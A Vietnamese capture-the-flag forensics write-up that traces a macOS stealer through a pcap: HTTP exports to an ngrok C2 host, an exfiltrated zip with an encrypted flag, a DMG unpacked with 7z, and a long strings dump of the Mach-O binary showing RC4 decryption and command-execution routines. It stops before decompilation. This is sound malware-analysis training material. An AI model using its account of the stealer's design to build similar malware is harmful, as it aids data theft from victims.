Description
Cortex XDR has been flagging alerts non-stop this Friday due to a suspicious file being downloaded by Zhu Yuan. Thankfully, my Wireshark was running so we managed to track down some of the malicious activity. It seems like the user received a malicious attachment from an unknown domain via email, and executed it in their machine.

Chall cho mình 1 file pcap, mở bằng wireshark

Kiểm tra bảng Protocol Hierarchy Statistics trong Wireshark, chúng ta phát hiện một lượng nhỏ dữ liệu truyền qua giao thức HTTP nhưng chứa các payload có kích thước bất thường (MIME Multipart và PNG).

<img width="1683" height="637" alt="image" src="https://github.com/user-attachments/assets/d993c74c-e6c6-4ebd-ac1d-dbf462711224" />


Lọc các HTTP request và sử dụng tính năng File > Export Objects > HTTP, chúng ta thu được các file đáng ngờ đang giao tiếp với một máy chủ C2 qua Ngrok (b2eb-115-135-31-192.ngrok-free.app):

<img width="1024" height="529" alt="image" src="https://github.com/user-attachments/assets/2a549c3e-155d-4787-a5be-d789a7a0dff7" />

LegitLobsterGameDownloader.dmg 

bangboo.png (94 kB) - File ảnh tải xuống.

joinsystem - Gói dữ liệu multipart/form-data 

Ngoài ra khi check packet chứa joinsystem thì mình còn nhận ra đây là 1 file zip:

<img width="1917" height="980" alt="image" src="https://github.com/user-attachments/assets/9018e08f-0c1a-4c12-9369-b08b84672468" />

Khi unzip thì mình thu được file flag.enc và tệp hệ thống bị mã độc đánh cắp. Có vẻ như flag đã bị encrypt và chúng ta cần phải decrypt

Tiếp đến mình phân tích thử LegitLobsterGameDownloader.dmg , theo như mình tìm hiểu file dmg là 1 file đĩa ảo của apple và có thể dùng 7z để bung nó ra.

```
7z x LegitLobsterGameDownloader.dmg



7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03

 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM



Scanning the drive for archives:

1 file, 58713 bytes (58 KiB)



Extracting archive: LegitLobsterGameDownloader.dmg

--

Path = LegitLobsterGameDownloader.dmg

Type = Dmg

Physical Size = 58713

Method = Zero0 Zero2 ZLIB CRC

Blocks = 18

Cluster Size = 1029120

Comment = 

{

unpack-size: 104857600

ID: 00000000000000000000000000000000

master-checksum: CRC: B96CE386

pack-offset: 0

pack-length: 49700

xml-offset: 49700

xml-length: 8501

}

----

Path = 4.hfs

Size = 104816640

Packed Size = 44394

Comment = disk image (Apple_HFS : 4)

Method = Zero0 Zero2 ZLIB CRC

Blocks = 11

Cluster Size = 1029120

Checksum = BF591573

ID = 4

--

Path = 4.hfs

Type = HFS

Physical Size = 104816640

Method = HFS+

Cluster Size = 4096

Free Space = 102273024

Created = 2025-01-16 19:13:57

Modified = 2025-01-16 23:13:58



Everything is Ok



Folders: 3

Files: 1

Size:       90000

Compressed: 58713
```
Mình thu đươc 1 số thông tin như trên, có thể thấy cấu trúc của file DMG này chứa một phân vùng ổ đĩa ảo của Apple (4.hfs). Điểm đáng chú ý nhất là dòng cuối cùng: Folders: 3, Files: 1.Cấu trúc "3 thư mục, 1 file" này cực kỳ đặc trưng cho một gói ứng dụng ngụy trang trên macOS. Cụ thể, nó thường được xếp chồng theo dạng: Tên_Ứng_Dụng.app > Contents > MacOS > File_thực_thi_duy_nhất.

Sau khi đã giải nén thì có 1 file thực thi thật

```
 file lobsterstealer         
lobsterstealer: Mach-O 64-bit x86_64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|WEAK_DEFINES|BINDS_TO_WEAK|PIE>
```
Đây là một Mach-O 64-bit executable – định dạng file thực thi nhị phân đã được biên dịch (compiled binary) của hệ điều hành macOS (tương tự như file .exe trên Windows).Trước tiên mình thử dùng strings để xem trong đó có thuật toán giải mã không sau đó đưa vào radare2 có sẵn trên linux để decompiler.
Kết quả khi mình dùng strings:
```
Decrypted command: 
vector
basic_string
__Unwind_Resume
__ZNKSt3__111__move_loopINS_17_ClassicAlgPolicyEEclB8ne180100INS_16reverse_iteratorIPhEES6_S6_EENS_4pairIT_T1_EES8_T0_S9_
__ZNKSt3__16locale9use_facetERNS0_2idE
__ZNKSt3__18ios_base6getlocEv
__ZNSt11logic_errorC2EPKc
__ZNSt12length_errorD1Ev
__ZNSt20bad_array_new_lengthC1Ev
__ZNSt20bad_array_new_lengthD1Ev
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE10__align_itB8ne180100ILm8EEEmm
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE16__init_with_sizeB8ne180100INS_11__wrap_iterIPhEES9_EEvT_T0_m
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6__initEPKcm
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6__initEmc
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6__initINS_11__wrap_iterIPhEELi0EEEvT_SA_
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1ERKS5_mmRKS4_
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED1Ev
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE3putEc
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE5flushEv
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryD1Ev
__ZNSt3__116allocator_traitsINS_9allocatorIcEEE8max_sizeB8ne180100IS2_vEEmRKS2_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE7destroyB8ne180100IhvEEvRS2_PT_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE8max_sizeB8ne180100IS2_vEEmRKS2_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE9constructB8ne180100IhJEvEEvRS2_PT_DpOT0_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE9constructB8ne180100IhJRKhEvEEvRS2_PT_DpOT0_
__ZNSt3__14cerrE
__ZNSt3__14coutE
__ZNSt3__14stoiERKNS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEEPmi
__ZNSt3__15ctypeIcE2idE
__ZNSt3__16localeD1Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE21__push_back_slow_pathIRKhEEPhOT_
__ZNSt3__16vectorIhNS_9allocatorIhEEE22__construct_one_at_endB8ne180100IJRKhEEEvDpOT_
__ZNSt3__18ios_base33__set_badbit_and_consider_rethrowEv
__ZNSt3__18ios_base5clearEj
__ZNSt3__19allocatorIhE9constructB8ne180100IhJEEEvPT_DpOT0_
__ZNSt3__19allocatorIhE9constructB8ne180100IhJRKhEEEvPT_DpOT0_
__ZSt9terminatev
__ZTISt12length_error
__ZTISt20bad_array_new_length
__ZTVSt12length_error
__ZdlPv
__Znwm
___cxa_allocate_exception
___cxa_begin_catch
___cxa_call_unexpected
___cxa_end_catch
___cxa_free_exception
___cxa_throw
___error
___gxx_personality_v0
_memset
_strerror
_strlen
_system
1rc4_decryptRKNSt3__16vectorIhNS_9allocatorIhEEEES5_
	2hex_to_bytesRKNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE
0__align_itB8ne180100ILm8EEEmm
6__init_with_sizeB8ne180100INS_11__wrap_iterIPhEES9_EEvT_T0_m
6__initINS_11__wrap_iterIPhEELi0EEEvT_SA_
EvEEvRS2_PT_DpOT0_
RKhEvEEvRS2_PT_DpOT0_
7destroyB8ne180100IhvEEvRS2_PT_
8max_sizeB8ne180100IS2_vEEmRKS2_
9constructB8ne180100IhJ
cEEE8max_sizeB8ne180100IS2_vEEmRKS2_
hEEE
2basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE
6allocator_traitsINS_9allocatorI
1__push_back_slow_pathIRKhEEPhOT_
2__construct_one_at_endB8ne180100IJRKhEEEvDpOT_
EEEvPT_DpOT0_
RKhEEEvPT_DpOT0_
6vectorIhNS_9allocatorIhEEE2
9allocatorIhE9constructB8ne180100IhJ
KSt3__111__move_loopINS_17_ClassicAlgPolicyEEclB8ne180100INS_16reverse_iteratorIPhEES6_S6_EENS_4pairIT_T1_EES8_T0_S9_
St3__1
25execute_decrypted_commandRKNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE
mh_execute_header
main
0   0 
 @ P
0000P
  @   
0  p @  
P0  
 @  0
p0    
0  @    
0 @@  0 
 0@00` 00
0 p 0 000P00
 `   
000 P00 Pp@
0@  
  P0@ p
0p00   
__Z11rc4_decryptRKNSt3__16vectorIhNS_9allocatorIhEEEES5_
__Z12hex_to_bytesRKNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE
__Z25execute_decrypted_commandRKNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE
__ZNKSt3__111__move_loopINS_17_ClassicAlgPolicyEEclB8ne180100INS_16reverse_iteratorIPhEES6_S6_EENS_4pairIT_T1_EES8_T0_S9_
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE10__align_itB8ne180100ILm8EEEmm
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE16__init_with_sizeB8ne180100INS_11__wrap_iterIPhEES9_EEvT_T0_m
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6__initINS_11__wrap_iterIPhEELi0EEEvT_SA_
__ZNSt3__116allocator_traitsINS_9allocatorIcEEE8max_sizeB8ne180100IS2_vEEmRKS2_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE7destroyB8ne180100IhvEEvRS2_PT_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE8max_sizeB8ne180100IS2_vEEmRKS2_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE9constructB8ne180100IhJEvEEvRS2_PT_DpOT0_
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE9constructB8ne180100IhJRKhEvEEvRS2_PT_DpOT0_
__ZNSt3__16vectorIhNS_9allocatorIhEEE21__push_back_slow_pathIRKhEEPhOT_
__ZNSt3__16vectorIhNS_9allocatorIhEEE22__construct_one_at_endB8ne180100IJRKhEEEvDpOT_
__ZNSt3__19allocatorIhE9constructB8ne180100IhJEEEvPT_DpOT0_
__ZNSt3__19allocatorIhE9constructB8ne180100IhJRKhEEEvPT_DpOT0_
__mh_execute_header
_main
__Unwind_Resume
__ZNKSt3__16locale9use_facetERNS0_2idE
__ZNKSt3__18ios_base6getlocEv
__ZNSt11logic_errorC2EPKc
__ZNSt12length_errorD1Ev
__ZNSt20bad_array_new_lengthC1Ev
__ZNSt20bad_array_new_lengthD1Ev
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6__initEPKcm
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6__initEmc
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1ERKS5_mmRKS4_
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED1Ev
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE3putEc
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE5flushEv
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryD1Ev
__ZNSt3__14cerrE
__ZNSt3__14coutE
__ZNSt3__14stoiERKNS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEEPmi
__ZNSt3__15ctypeIcE2idE
__ZNSt3__16localeD1Ev
__ZNSt3__18ios_base33__set_badbit_and_consider_rethrowEv
__ZNSt3__18ios_base5clearEj
__ZSt9terminatev
__ZTISt12length_error
__ZTISt20bad_array_new_length
__ZTVSt12length_error
__ZdlPv
__Znwm
___cxa_allocate_exception
___cxa_begin_catch
___cxa_call_unexpected
___cxa_end_catch
___cxa_free_exception
___cxa_throw
___error
___gxx_personality_v0
_memset
_strerror
_strlen
_system
__ZNSt3__16vectorIhNS_9allocatorIhEEEC1Em
__ZNKSt3__16vectorIhNS_9allocatorIhEEE4sizeB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEEixB8ne180100Em
__ZNKSt3__16vectorIhNS_9allocatorIhEEEixB8ne180100Em
__ZNSt3__14swapB8ne180100IhEEvRT_S2_
__ZNSt3__16vectorIhNS_9allocatorIhEEED1B8ne180100Ev
___clang_call_terminate
__ZNSt3__16vectorIhNS_9allocatorIhEEEC1B8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6lengthB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE6substrB8ne180100Emm
__ZNSt3__16vectorIhNS_9allocatorIhEEE9push_backB8ne180100ERKh
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5c_strB8ne180100Ev
__ZNSt3__1lsB8ne180100INS_11char_traitsIcEEEERNS_13basic_ostreamIcT_EES6_PKc
__ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsB8ne180100EPFRS3_S4_E
__ZNSt3__14endlB8ne180100IcNS_11char_traitsIcEEEERNS_13basic_ostreamIT_T0_EES7_
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100ILi0EEEPKc
__ZNSt3__16vectorIhNS_9allocatorIhEEE5beginB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE3endB8ne180100Ev
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100INS_11__wrap_iterIPhEELi0EEET_SA_
__ZNSt3__1lsB8ne180100IcNS_11char_traitsIcEENS_9allocatorIcEEEERNS_13basic_ostreamIT_T0_EES9_RKNS_12basic_stringIS6_S7_T1_EE
__ZNSt3__16vectorIhNS_9allocatorIhEEEC2Em
__ZNSt3__117__compressed_pairIPhNS_9allocatorIhEEEC1B8ne180100IDnNS_18__default_init_tagEEEOT_OT0_
__ZNSt3__122__make_exception_guardB8ne180100INS_6vectorIhNS_9allocatorIhEEE16__destroy_vectorEEENS_28__exception_guard_exceptionsIT_EES7_
__ZNSt3__16vectorIhNS_9allocatorIhEEE16__destroy_vectorC1B8ne180100ERS3_
__ZNSt3__16vectorIhNS_9allocatorIhEEE11__vallocateB8ne180100Em
__ZNSt3__16vectorIhNS_9allocatorIhEEE18__construct_at_endEm
__ZNSt3__128__exception_guard_exceptionsINS_6vectorIhNS_9allocatorIhEEE16__destroy_vectorEE10__completeB8ne180100Ev
__ZNSt3__128__exception_guard_exceptionsINS_6vectorIhNS_9allocatorIhEEE16__destroy_vectorEED1B8ne180100Ev
__ZNSt3__117__compressed_pairIPhNS_9allocatorIhEEEC2B8ne180100IDnNS_18__default_init_tagEEEOT_OT0_
__ZNSt3__122__compressed_pair_elemIPhLi0ELb0EEC2B8ne180100IDnvEEOT_
__ZNSt3__122__compressed_pair_elemINS_9allocatorIhEELi1ELb1EEC2B8ne180100ENS_18__default_init_tagE
__ZNSt3__19allocatorIhEC2B8ne180100Ev
__ZNSt3__116__non_trivial_ifILb1ENS_9allocatorIhEEEC2B8ne180100Ev
__ZNSt3__128__exception_guard_exceptionsINS_6vectorIhNS_9allocatorIhEEE16__destroy_vectorEEC1B8ne180100ES5_
__ZNSt3__128__exception_guard_exceptionsINS_6vectorIhNS_9allocatorIhEEE16__destroy_vectorEEC2B8ne180100ES5_
__ZNSt3__16vectorIhNS_9allocatorIhEEE16__destroy_vectorC2B8ne180100ERS3_
__ZNKSt3__16vectorIhNS_9allocatorIhEEE8max_sizeEv
__ZNKSt3__16vectorIhNS_9allocatorIhEEE20__throw_length_errorB8ne180100Ev
__ZNSt3__119__allocate_at_leastB8ne180100INS_9allocatorIhEEEENS_19__allocation_resultINS_16allocator_traitsIT_E7pointerEEERS5_m
__ZNSt3__16vectorIhNS_9allocatorIhEEE7__allocB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE9__end_capB8ne180100Ev
__ZNKSt3__16vectorIhNS_9allocatorIhEEE14__annotate_newB8ne180100Em
__ZNSt3__13minB8ne180100ImEERKT_S3_S3_
__ZNKSt3__16vectorIhNS_9allocatorIhEEE7__allocB8ne180100Ev
__ZNSt3__114numeric_limitsIlE3maxB8ne180100Ev
__ZNSt3__13minB8ne180100ImNS_6__lessIvvEEEERKT_S5_S5_T0_
__ZNKSt3__16__lessIvvEclB8ne180100ImmEEbRKT_RKT0_
__ZNKSt3__19allocatorIhE8max_sizeB8ne180100Ev
__ZNKSt3__117__compressed_pairIPhNS_9allocatorIhEEE6secondB8ne180100Ev
__ZNKSt3__122__compressed_pair_elemINS_9allocatorIhEELi1ELb1EE5__getB8ne180100Ev
__ZNSt3__123__libcpp_numeric_limitsIlLb1EE3maxB8ne180100Ev
__ZNSt3__120__throw_length_errorB8ne180100EPKc
__ZNSt12length_errorC1B8ne180100EPKc
__ZNSt12length_errorC2B8ne180100EPKc
__ZNSt3__19allocatorIhE8allocateB8ne180100Em
__ZSt28__throw_bad_array_new_lengthB8ne180100v
__ZNSt3__130__libcpp_is_constant_evaluatedB8ne180100Ev
__ZNSt3__117__libcpp_allocateB8ne180100Emm
__ZNSt3__121__libcpp_operator_newB8ne180100IJmEEEPvDpT_
__ZNSt3__117__compressed_pairIPhNS_9allocatorIhEEE6secondB8ne180100Ev
__ZNSt3__122__compressed_pair_elemINS_9allocatorIhEELi1ELb1EE5__getB8ne180100Ev
__ZNSt3__117__compressed_pairIPhNS_9allocatorIhEEE5firstB8ne180100Ev
__ZNSt3__122__compressed_pair_elemIPhLi0ELb0EE5__getB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE21_ConstructTransactionC1B8ne180100ERS3_m
__ZNSt3__112__to_addressB8ne180100IhEEPT_S2_
__ZNSt3__16vectorIhNS_9allocatorIhEEE21_ConstructTransactionD1B8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE21_ConstructTransactionC2B8ne180100ERS3_m
__ZNSt3__16vectorIhNS_9allocatorIhEEE21_ConstructTransactionD2B8ne180100Ev
__ZNSt3__128__exception_guard_exceptionsINS_6vectorIhNS_9allocatorIhEEE16__destroy_vectorEED2B8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE16__destroy_vectorclB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE7__clearB8ne180100Ev
__ZNKSt3__16vectorIhNS_9allocatorIhEEE17__annotate_deleteB8ne180100Ev
__ZNSt3__116allocator_traitsINS_9allocatorIhEEE10deallocateB8ne180100ERS2_Phm
__ZNKSt3__16vectorIhNS_9allocatorIhEEE8capacityB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEE22__base_destruct_at_endB8ne180100EPh
__ZNSt3__19allocatorIhE7destroyB8ne180100EPh
__ZNSt3__19allocatorIhE10deallocateB8ne180100EPhm
__ZNSt3__119__libcpp_deallocateB8ne180100EPvmm
__ZNSt3__127__do_deallocate_handle_sizeB8ne180100IJEEEvPvmDpT_
__ZNSt3__124__libcpp_operator_deleteB8ne180100IJPvEEEvDpT_
__ZNKSt3__16vectorIhNS_9allocatorIhEEE9__end_capB8ne180100Ev
__ZNKSt3__117__compressed_pairIPhNS_9allocatorIhEEE5firstB8ne180100Ev
__ZNKSt3__122__compressed_pair_elemIPhLi0ELb0EE5__getB8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEED2B8ne180100Ev
__ZNSt3__16vectorIhNS_9allocatorIhEEEC2B8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE4sizeB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE9__is_longB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE15__get_long_sizeB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE16__get_short_sizeB8ne180100Ev
__ZNKSt3__117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_E5firstB8ne180100Ev
__ZNKSt3__122__compressed_pair_elemINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repELi0ELb0EE5__getB8ne180100Ev
__ZNSt3__19allocatorIcEC1B8ne180100Ev
__ZNSt3__19allocatorIcEC2B8ne180100Ev
__ZNSt3__116__non_trivial_ifILb1ENS_9allocatorIcEEEC2B8ne180100Ev
__ZNKSt3__16vectorIhNS_9allocatorIhEEE11__recommendB8ne180100Em
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEEC1EmmS3_
__ZNSt3__16vectorIhNS_9allocatorIhEEE26__swap_out_circular_bufferERNS_14__split_bufferIhRS2_EE
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEED1Ev
__ZNSt3__13maxB8ne180100ImEERKT_S3_S3_
__ZNSt3__13maxB8ne180100ImNS_6__lessIvvEEEERKT_S5_S5_T0_
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEEC2EmmS3_
__ZNSt3__117__compressed_pairIPhRNS_9allocatorIhEEEC1B8ne180100IDnS4_EEOT_OT0_
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEE7__allocB8ne180100Ev
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEE9__end_capB8ne180100Ev
__ZNSt3__117__compressed_pairIPhRNS_9allocatorIhEEEC2B8ne180100IDnS4_EEOT_OT0_
__ZNSt3__122__compressed_pair_elemIRNS_9allocatorIhEELi1ELb0EEC2B8ne180100IS3_vEEOT_
__ZNSt3__117__compressed_pairIPhRNS_9allocatorIhEEE6secondB8ne180100Ev
__ZNSt3__122__compressed_pair_elemIRNS_9allocatorIhEELi1ELb0EE5__getB8ne180100Ev
__ZNSt3__117__compressed_pairIPhRNS_9allocatorIhEEE5firstB8ne180100Ev
__ZNSt3__142__uninitialized_allocator_move_if_noexceptB8ne180100INS_9allocatorIhEENS_16reverse_iteratorIPhEES5_hvEET1_RT_T0_S9_S6_
__ZNSt3__116reverse_iteratorIPhEC1B8ne180100ES1_
__ZNKSt3__116reverse_iteratorIPhE4baseB8ne180100Ev
__ZNSt3__14swapB8ne180100IPhEEvRT_S3_
__ZNSt3__1neB8ne180100IPhS1_EEbRKNS_16reverse_iteratorIT_EERKNS2_IT0_EE
__ZNSt3__114__construct_atB8ne180100IhJhEPhEEPT_S3_DpOT0_
__ZNSt3__112__to_addressB8ne180100INS_16reverse_iteratorIPhEEvEEu7__decayIDTclsr19__to_address_helperIT_EE6__callclsr3stdE7declvalIRKS4_EEEEES6_
__ZNKSt3__116reverse_iteratorIPhEdeB8ne180100Ev
__ZNSt3__116reverse_iteratorIPhEppB8ne180100Ev
__ZNSt3__14moveB8ne180100INS_16reverse_iteratorIPhEES3_EET0_T_S5_S4_
__ZNSt3__119__to_address_helperINS_16reverse_iteratorIPhEEvE6__callB8ne180100ERKS3_
__ZNKSt3__116reverse_iteratorIPhEptB8ne180100Ev
__ZNSt3__16__moveB8ne180100INS_17_ClassicAlgPolicyENS_16reverse_iteratorIPhEES4_S4_EENS_4pairIT0_T2_EES6_T1_S7_
__ZNSt3__123__dispatch_copy_or_moveB8ne180100INS_17_ClassicAlgPolicyENS_11__move_loopIS1_EENS_14__move_trivialENS_16reverse_iteratorIPhEES7_S7_EENS_4pairIT2_T4_EES9_T3_SA_
__ZNSt3__121__unwrap_and_dispatchB8ne180100INS_10__overloadINS_11__move_loopINS_17_ClassicAlgPolicyEEENS_14__move_trivialEEENS_16reverse_iteratorIPhEES9_S9_Li0EEENS_4pairIT0_T2_EESB_T1_SC_
__ZNSt3__114__unwrap_rangeB8ne180100INS_16reverse_iteratorIPhEES3_EENS_4pairIT0_S5_EET_S7_
__ZNSt3__113__unwrap_iterB8ne180100INS_16reverse_iteratorIPhEENS_18__unwrap_iter_implIS3_Lb0EEELi0EEEDTclsrT0_8__unwrapclsr3stdE7declvalIT_EEEES7_
__ZNSt3__19make_pairB8ne180100INS_16reverse_iteratorIPhEES3_EENS_4pairINS_18__unwrap_ref_decayIT_E4typeENS5_IT0_E4typeEEEOS6_OS9_
__ZNSt3__114__rewrap_rangeB8ne180100INS_16reverse_iteratorIPhEES3_EET_S4_T0_
__ZNSt3__113__rewrap_iterB8ne180100INS_16reverse_iteratorIPhEES3_NS_18__unwrap_iter_implIS3_Lb0EEEEET_S6_T0_
__ZNSt3__18_IterOpsINS_17_ClassicAlgPolicyEE11__iter_moveB8ne180100IRNS_16reverse_iteratorIPhEELi0EEEDTclsr3stdE4movedeclsr3stdE7declvalIRT_EEEEOS8_
__ZNSt3__18_IterOpsINS_17_ClassicAlgPolicyEE25__validate_iter_referenceB8ne180100IRNS_16reverse_iteratorIPhEEEEvv
__ZNSt3__118__unwrap_iter_implINS_16reverse_iteratorIPhEELb0EE8__unwrapB8ne180100ES3_
__ZNSt3__14pairINS_16reverse_iteratorIPhEES3_EC1B8ne180100ERKS3_S6_
__ZNSt3__14pairINS_16reverse_iteratorIPhEES3_EC2B8ne180100ERKS3_S6_
__ZNSt3__118__unwrap_iter_implINS_16reverse_iteratorIPhEELb0EE8__rewrapB8ne180100ES3_S3_
__ZNSt3__116reverse_iteratorIPhEC2B8ne180100ES1_
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEED2Ev
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEE5clearB8ne180100Ev
__ZNKSt3__114__split_bufferIhRNS_9allocatorIhEEE8capacityB8ne180100Ev
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEE17__destruct_at_endB8ne180100EPh
__ZNSt3__114__split_bufferIhRNS_9allocatorIhEEE17__destruct_at_endB8ne180100EPhNS_17integral_constantIbLb0EEE
__ZNKSt3__114__split_bufferIhRNS_9allocatorIhEEE9__end_capB8ne180100Ev
__ZNKSt3__117__compressed_pairIPhRNS_9allocatorIhEEE5firstB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE4dataB8ne180100Ev
__ZNSt3__112__to_addressB8ne180100IKcEEPT_S3_
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE13__get_pointerB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE18__get_long_pointerB8ne180100Ev
__ZNKSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE19__get_short_pointerB8ne180100Ev
__ZNSt3__114pointer_traitsIPKcE10pointer_toB8ne180100ERS1_
__ZNSt3__124__put_character_sequenceB8ne180100IcNS_11char_traitsIcEEEERNS_13basic_ostreamIT_T0_EES7_PKS4_m
__ZNSt3__111char_traitsIcE6lengthB8ne180100EPKc
__ZNKSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentrycvbB8ne180100Ev
__ZNSt3__116__pad_and_outputB8ne180100IcNS_11char_traitsIcEEEENS_19ostreambuf_iteratorIT_T0_EES6_PKS4_S8_S8_RNS_8ios_baseES4_
__ZNSt3__119ostreambuf_iteratorIcNS_11char_traitsIcEEEC1B8ne180100ERNS_13basic_ostreamIcS2_EE
__ZNKSt3__18ios_base5flagsB8ne180100Ev
__ZNKSt3__19basic_iosIcNS_11char_traitsIcEEE4fillB8ne180100Ev
__ZNKSt3__119ostreambuf_iteratorIcNS_11char_traitsIcEEE6failedB8ne180100Ev
__ZNSt3__19basic_iosIcNS_11char_traitsIcEEE8setstateB8ne180100Ej
__ZNKSt3__18ios_base5widthB8ne180100Ev
__ZNSt3__115basic_streambufIcNS_11char_traitsIcEEE5sputnB8ne180100EPKcl
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC1B8ne180100Emc
__ZNSt3__18ios_base5widthB8ne180100El
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC2B8ne180100Emc
__ZNSt3__117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_EC1B8ne180100INS_18__default_init_tagESA_EEOT_OT0_
__ZNSt3__117__compressed_pairINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repES5_EC2B8ne180100INS_18__default_init_tagESA_EEOT_OT0_
__ZNSt3__122__compressed_pair_elemINS_12basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEE5__repELi0ELb0EEC2B8ne180100ENS_18__default_init_tagE
__ZNSt3__122__compressed_pair_elemINS_9allocatorIcEELi1ELb1EEC2B8ne180100ENS_18__default_init_tagE
__ZNSt3__119ostreambuf_iteratorIcNS_11char_traitsIcEEEC2B8ne180100ERNS_13basic_ostreamIcS2_EE
__ZNKSt3__19basic_iosIcNS_11char_traitsIcEEE5rdbufB8ne180100Ev
__ZNKSt3__18ios_base5rdbufB8ne180100Ev
__ZNSt3__111char_traitsIcE11eq_int_typeB8ne180100Eii
__ZNSt3__111char_traitsIcE3eofB8ne180100Ev
__ZNKSt3__19basic_iosIcNS_11char_traitsIcEEE5widenB8ne180100Ec
__ZNSt3__19use_facetB8ne180100INS_5ctypeIcEEEERKT_RKNS_6localeE
__ZNKSt3__15ctypeIcE5widenB8ne180100Ec
__ZNSt3__18ios_base8setstateB8ne180100Ej
__ZNSt3__118__constexpr_strlenB8ne180100EPKc
__ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEC2B8ne180100ILi0EEEPKc
__ZNSt3__16vectorIhNS_9allocatorIhEEE11__make_iterB8ne180100EPh
__ZNSt3__111__wrap_iterIPhEC1B8ne180100ES1_
__ZNSt3__111__wrap_iterIPhEC2B8ne180100ES1_
